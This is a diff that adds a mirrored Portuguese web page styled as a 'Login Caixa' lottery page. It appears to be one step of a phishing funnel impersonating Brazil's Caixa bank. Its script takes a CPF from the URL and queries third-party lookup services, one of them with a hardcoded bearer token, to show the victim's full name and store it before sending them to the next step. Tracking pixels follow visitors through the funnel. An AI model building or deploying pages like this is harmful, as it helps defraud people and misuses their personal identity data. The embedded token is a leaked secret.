@@ -1,0 +1,372 @@
+<!DOCTYPE html><html lang="pt-br">
+<!-- Mirrored from www.tenhaagora.site/mega/2/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 08 Nov 2025 12:39:17 GMT -->
+<head>
+
+
+<meta charset="utf-8">
+<script>
+  // ==== PIXEL BASE OFICIAL ====
+  !(function(f,b,e,v,n,t,s){
+    if(f.fbq)return;
+    n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;
+    n.push=n;
+    n.loaded=!0;
+    n.version='2.0';
+    n.queue=[];
+    t=b.createElement(e);t.async=!0;
+    t.src='https://connect.facebook.net/en_US/fbevents.js';
+    s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s);
+  })(window, document,'script');
+
+  // ==== INICIALIZA COM SEU PIXEL ====
+  fbq('init', '834444302892712');
+
+  // ==== EVENTO BASE: PAGEVIEW EM TODAS AS PÁGINAS ====
+  fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+       src="https://www.facebook.com/tr?id=834444302892712&ev=PageView&noscript=1"/>
+</noscript>
+<!-- FIM META PIXEL BASE -->
+
+
+<script>
+  // ====== UTMs DA URL ======
+  function getUTMs() {
+    try {
+      const url = new URL(window.location.href);
+      return {
+        utm_source:   url.searchParams.get("utm_source")   || "",
+        utm_medium:   url.searchParams.get("utm_medium")   || "",
+        utm_campaign: url.searchParams.get("utm_campaign") || "",
+        utm_content:  url.searchParams.get("utm_content")  || "",
+        utm_term:     url.searchParams.get("utm_term")     || ""
+      };
+    } catch (e) {
+      return {};
+    }
+  }
+
+  // ====== DEVICE / NAVEGADOR ======
+  function getDeviceData() {
+    return {
+      device_user_agent: navigator.userAgent || "",
+      device_language:   navigator.language || "",
+      screen_width:      window.innerWidth || screen.width || null,
+      screen_height:     window.innerHeight || screen.height || null,
+      platform:          navigator.platform || ""
+    };
+  }
+
+  // ====== FIRST TOUCH (primeira página) ======
+  if (!localStorage.getItem("first_page")) {
+    localStorage.setItem("first_page", window.location.href);
+  }
+  function getFirstTouch() {
+    return {
+      first_page: localStorage.getItem("first_page") || ""
+    };
+  }
+
+  // ====== LAST TOUCH (última página) ======
+  localStorage.setItem("last_page", window.location.href);
+  function getLastTouch() {
+    return {
+      last_page: localStorage.getItem("last_page") || ""
+    };
+  }
+
+  // ====== REFERRER (de onde veio) ======
+  function getReferrer() {
+    return {
+      referrer: document.referrer || ""
+    };
+  }
+
+  // ====== TEMPO NA PÁGINA (em segundos) ======
+  let __pageTime = 0;
+  setInterval(function () {
+    __pageTime++;
+  }, 1000);
+
+  function getTimeOnPage() {
+    return {
+      time_on_page: __pageTime
+    };
+  }
+
+  // ====== FUNÇÃO MESTRE: JUNTA TUDO ======
+  function getEnrichedData(extraData) {
+    return Object.assign(
+      {},
+      getUTMs(),
+      getDeviceData(),
+      getFirstTouch(),
+      getLastTouch(),
+      getReferrer(),
+      getTimeOnPage(),
+      extraData || {}
+    );
+  }
+</script>
+
+<script>
+  fbq('track', 'ViewContent', getEnrichedData({
+    funnel_step: 'page_3_identity_check'
+  }));
+</script>
+
+
+
+<meta charset="utf-8">
+
+<script>
+  window.pixelId = "692a44b579268a6ee3c01522";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="../../scripts/utms/latest-2.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loterias Online</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="../../css2-2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;display=swap" rel="stylesheet">
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+        window.pixelId = "675c826bfe3c5b3055ee8bfd";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script><script async="" defer="" src="js/pixel.js"></script>
+  <style>
+    @font-face {
+        font-family: 'Futura-Book';
+        src: url('fonts/Futura-Book.eot');
+        src: url('fonts/Futura-Book.eot') format('embedded-opentype'),
+            url('fonts/Futura-Book.woff2') format('woff2'),
+            url('fonts/Futura-Book.woff') format('woff'),
+            url('fonts/Futura-Book.ttf') format('truetype'),
+            url('images/Futura-Book.svg') format('svg');
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+    }
+
+    body {
+    font-family: 'Futura-Book', sans-serif;
+    font-weight: 400; /* Exemplo: peso regular */
+    }
+
+    .container-bg {
+        background: linear-gradient(45deg, #00a9ad, #005ca9); 
+        background-size: 100%;
+        background-repeat: no-repeat;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .container-principal {
+        height: auto;
+        margin: 0 auto;
+        background-color: white;
+        width: 450px;
+        max-width: 95%;
+        color: black;
+        background-color: #fff !important;
+        border-radius: .4rem;
+        box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
+        padding: 3rem 4rem;
+    }
+
+    @media (max-width: 576px) {
+        .container-principal {
+            padding: 3rem 2rem !important;
+        } 
+    }
+
+    .container-principal img {
+        width: 150px;
+    }
+
+    .container-principal h1 {
+        color: #0070ae;
+        font-size: 1rem;
+        margin-top: .4rem;
+    }
+
+    .container-principal h2 {
+        color: #4d7880;
+        font-size: 1.1rem;
+        margin-top: 1rem;
+        margin-bottom: .5rem;
+        width: 100%;
+        text-align: justify;
+    }
+
+    .container-principal h3 {
+        color: #0070ae;
+        font-size: 1rem;
+        margin-top: 1.1rem;
+    }
+
+    .container-principal h3 a{
+        color: #0070ae;
+        font-weight: 600;
+    }
+
+
+    .container-principal form {
+        width: 100%;
+        display: flex;
+        justify-content: start;
+        color: #4d7880;
+        font-size: 1.1rem;
+        margin-top: .4rem;
+    }
+
+    .container-principal form label {
+        margin-left: .4rem;
+    }
+
+
+    
+    .botoes {
+        margin-top: 1rem;
+    }
+
+    .botoes a {
+        width: 100%;
+    }
+
+    .botoes button  {
+        background-color: #f39200;
+        color: white;
+        font-weight: 500;
+        width: 100%;
+        border: none;
+        padding: .5rem 1rem;
+        font-size: 1rem;
+        border-radius: .2rem;
+        margin-bottom: .6rem
+    }
+
+    .botoes button:hover {
+        background-color: #173e68;
+    }
+
+    button.btn-nao {
+         background-color: transparent !important;
+         border: solid 2px #f39200;
+         color: #f39200;
+    }
+    
+  </style>
+  <body>
+    <div class="container-bg">
+        <div class="container-principal d-flex justify-content-center align-items-center flex-column">
+            <img src="images/logo-caixa.webp" alt="">
+            <h1>Login Caixa</h1>
+            <h2>Para continuar, confirme se o seu cpf está corrreto.</h2>
+            <h2>Nome:</h2>
+            <form>
+            <input type="radio" checked=""> <br>
+            <label> <p id="userNameDisplay"></p> </label>
+        </form>  
+        
+        <div class="botoes w-100 d-flex flex-column justify-content-center align-items-center">
+            <a href="../3/index.html"><button>Sim, sou eu</button></a>
+            <a href="../1/index.html"><button class="btn-nao">Quero alterar meus dados</button></a>
+        </div>
+        
+        <h3><a href="#">Preciso de ajuda</a></h3>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const cpf = params.get('cpf');
+  const userNameDisplay = document.getElementById('userNameDisplay');
+
+  if (cpf) {
+    userNameDisplay.textContent = 'Carregando...';
+
+    // Tenta consultar o nome do CPF usando APIs públicas. Primeiro usa o endpoint
+    // federal‑leilao.com (rota contratediscordrev0ltz), que normalmente não exige
+    // autenticação. Caso falhe (rede ou resposta inválida), tenta DataGet com token.
+    const token = '5664016cd07486d17adea9f73884bf398a52b89593c33f114fd9c6bbddb3b26f';
+    const endpointFallback = `https://federal-leilao.com/v1/contratediscordrev0ltz/${cpf}`;
+    const endpointDataGet = `https://api.dataget.site/api/v1/cpf/${cpf}`;
+
+    function setNome(nome) {
+      if (nome) {
+        userNameDisplay.textContent = nome;
+        try {
+          localStorage.setItem('nomeCompleto', nome);
+        } catch (e) {
+          console.warn('localStorage não está disponível', e);
+        }
+      } else {
+        userNameDisplay.textContent = 'Nome não encontrado para o CPF informado.';
+      }
+    }
+
+    // Chama DataGet primeiro. Se falhar, tenta fallback.
+    fetch(endpointDataGet, {
+      headers: {
+        'Authorization': 'Bearer ' + token
+      }
+    }).then(resp => {
+      if (!resp.ok) throw new Error('DataGet não respondeu');
+      return resp.json();
+    }).then(data => {
+      let nome = data && (data.NOME || data.nome || data.NOME_COMPLETO);
+      if (!nome && data && data.data) {
+        // alguns retornos podem vir aninhados em data
+        nome = data.data.NOME || data.data.nome || data.data.NOME_COMPLETO;
+      }
+      if (nome) {
+        setNome(nome);
+      } else {
+        // se não achar nome, tenta fallback
+        throw new Error('Nome não encontrado em DataGet');
+      }
+    }).catch(() => {
+      fetch(endpointFallback)
+        .then(resp2 => {
+          if (!resp2.ok) throw new Error('Fallback não respondeu');
+          return resp2.json();
+        })
+        .then(data2 => {
+          let nome = data2 && (data2.nome || data2.NOME);
+          setNome(nome);
+        })
+        .catch(err2 => {
+          console.error('Erro ao consultar nome:', err2);
+          userNameDisplay.textContent = 'Erro ao buscar dados. Tente novamente mais tarde.';
+        });
+    });
+
+  }
+</script>
+
+
+    
+
+    <script src="../../npm/bootstrap%405.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
+    </div></div></body>
+
+<!-- Mirrored from www.tenhaagora.site/mega/2/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 08 Nov 2025 12:39:26 GMT -->
+</head></html>
